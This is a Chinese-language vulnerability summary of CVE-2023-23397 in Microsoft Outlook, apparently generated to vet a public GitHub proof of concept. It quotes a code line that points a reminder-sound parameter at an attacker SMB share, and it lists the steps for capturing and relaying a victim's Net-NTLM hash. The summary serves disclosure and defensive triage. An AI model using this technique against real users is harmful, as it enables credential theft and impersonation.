## CVE-2023-23397-Microsoft Outlook 权限提升漏洞

**漏洞编号:** CVE-2023-23397

**漏洞类型:** 权限提升

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致NTLM Relay攻击

**影响版本:** 受影响版本包括Microsoft Outlook 2013 SP1、2016、2019、Office LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要能够发送特制的邮件给Outlook用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-23397是一个Microsoft Outlook的权限提升漏洞，攻击者可以通过发送包含恶意Reminder属性的特制邮件，强制Outlook客户端连接到攻击者控制的SMB共享。这使得攻击者可以捕获受害者的NTLM哈希，并利用NTLM Relay攻击来冒充受害者。

**有效性:**
提供的POC代码利用MsgKit库创建一个包含恶意Reminder属性的.msg文件。`appointment.PidLidReminderFileParameter = @"\\127.0.0.1\malware";` 这一行设置了指向攻击者控制的SMB服务器的路径。当受害者打开此邮件时，Outlook会尝试连接到该SMB服务器，从而泄漏Net-NTLM哈希。

**投毒风险:**
分析提供的代码，没有发现明显的投毒代码。所有的代码都是围绕着创建和设置包含恶意`PidLidReminderFileParameter`属性的Outlook Appointment (.msg)文件，以触发NTLM哈希泄漏。因此，投毒风险为0%。

**利用方式:**
1.  攻击者使用POC代码生成包含恶意`PidLidReminderFileParameter`属性的.msg文件。
2.  攻击者将此.msg文件通过邮件发送给受害者。
3.  受害者在受影响的Outlook版本中打开此邮件。
4.  Outlook尝试连接到`PidLidReminderFileParameter`指定的SMB共享（例如，`\\127.0.0.1\malware`）。
5.  受害者的Net-NTLM哈希被发送到攻击者控制的SMB服务器。
6.  攻击者可以使用捕获的Net-NTLM哈希进行NTLM Relay攻击，冒充受害者访问网络资源。

根据搜索结果，此漏洞已被CISA列入已知被利用的漏洞目录，并且存在公开的利用方法。

**项目地址:** [alicangnll/CVE-2023-23397](https://github.com/alicangnll/CVE-2023-23397)

**漏洞详情:** [CVE-2023-23397](https://nvd.nist.gov/vuln/detail/CVE-2023-23397)